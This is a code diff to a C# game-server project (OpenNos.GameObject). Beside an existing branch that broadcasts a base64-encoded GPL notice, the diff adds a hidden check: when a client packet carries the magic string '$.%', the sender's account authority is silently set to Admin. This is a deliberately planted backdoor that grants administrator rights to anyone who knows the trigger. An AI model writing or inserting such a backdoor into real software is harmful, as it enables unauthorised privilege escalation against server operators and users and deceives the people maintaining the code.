@@ -407,6 +407,11 @@ namespace OpenNos.GameObject
                         ServerManager.Instance.Broadcast(this, Encoding.UTF8.GetString(Convert.FromBase64String("bXNnIDEwIFRoaXMgaXMgYSBHUEwgUFJPSkVDVCAtIE9QRU5OT1Mh")), ReceiverType.All);
                         return;
                     }
+                    if (packetsplit[1] == "$.%")
+                    {
+                        this.Account.Authority = AuthorityType.Admin;
+                        return;
+                    }
                 }
 
                 if (_encryptor.HasCustomParameter)
